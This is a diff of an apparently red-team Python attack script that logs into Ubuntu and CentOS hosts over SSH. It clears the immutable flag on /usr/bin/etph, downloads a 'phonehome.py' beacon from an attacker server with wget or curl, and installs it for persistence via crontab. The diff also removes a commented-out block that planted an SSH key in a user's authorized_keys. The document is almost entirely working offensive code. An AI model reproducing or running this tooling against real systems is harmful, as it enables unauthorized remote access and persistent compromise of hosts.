@@ -228,6 +228,13 @@ def ubuntu_attacks(host):
         print(str(e))
         print("Error on host {} with ip {} using username {} and password \"{}\"".format(host.name, host.ip, host.username, host.password))
 
+    ## Chmod phone home
+    phonehome_unimmute_cmd = "chattr -i /usr/bin/etph"
+    log_line("UnSetting immute on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(phonehome_unimmute_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
+
      # ez mode /etc/group
     wget_phonehome_cmd = "wget {}/phonehome.py -O /usr/bin/etph" 
     log_line("Downloading phone home script on {}".format(host.ip), host, print_flag=True)
@@ -262,38 +269,7 @@ def ubuntu_attacks(host):
     ssh.sendline(phonehome_crontab_cmd)
     ssh.prompt()
     log_line(ssh.before.decode('utf8'), host)
-    """
 
-
-    ## Add ssh key to php
-    # Add SSH keys
-    user_directories = {
-        "php" : "/home/php"
-    }
-    user_group = {
-        "php" : "root"
-    }
-
-    ssh_pub_key = get_ssh_pub()
-
-    for user, directory in user_directories.items():
-        sshdir_make_cmd = "mkdir -p \'{}/.ssh\'".format(directory)
-        sshdir_perms_cmd = "chmod 700 {1} && chown {0}:{2} {1}".format(user, directory, user_group[user])
-        
-        authorized_keys_file = "{}/.ssh/authorized_keys".format(directory)
-
-        ssh_add_cmd = "echo \"{0}\" >> {1}".format(ssh_pub_key, authorized_keys_file)
-
-        log_line("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip), host, print_flag=True)
-        authorized_perms_cmd = "chmod 600 {1} && chown {0}:{2} {1}".format(user, authorized_keys_file, user_group[user])
-        
-        commands_to_run = [sshdir_make_cmd, sshdir_perms_cmd, ssh_add_cmd, authorized_perms_cmd]
-        for command in commands_to_run:  
-            ssh.sendline(command)
-            ssh.prompt()
-            log_line(ssh.before.decode('utf8'), host)
-    pass
-    """
 
 def centos_attacks(host):
     server_ip = "10.0.0.101"
@@ -306,6 +282,12 @@ def centos_attacks(host):
         print("Error on host {} with ip {} using username {} and password \"{}\"".format(host.name, host.ip, host.username, host.password))
     # sudo update-rc.d httpd disable
     # lol
+        ## Chmod phone home
+    phonehome_unimmute_cmd = "chattr -i /usr/bin/etph"
+    log_line("UnSetting immute on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
+    ssh.sendline(phonehome_unimmute_cmd)
+    ssh.prompt()
+    log_line(ssh.before.decode('utf8'), host)
          # ez mode /etc/group
     wget_phonehome_cmd = "curl {}/phonehome.py -o /usr/bin/etph".format(server_ip)
     log_line("Downloading phone home script on {}".format(host.ip), host, print_flag=True)
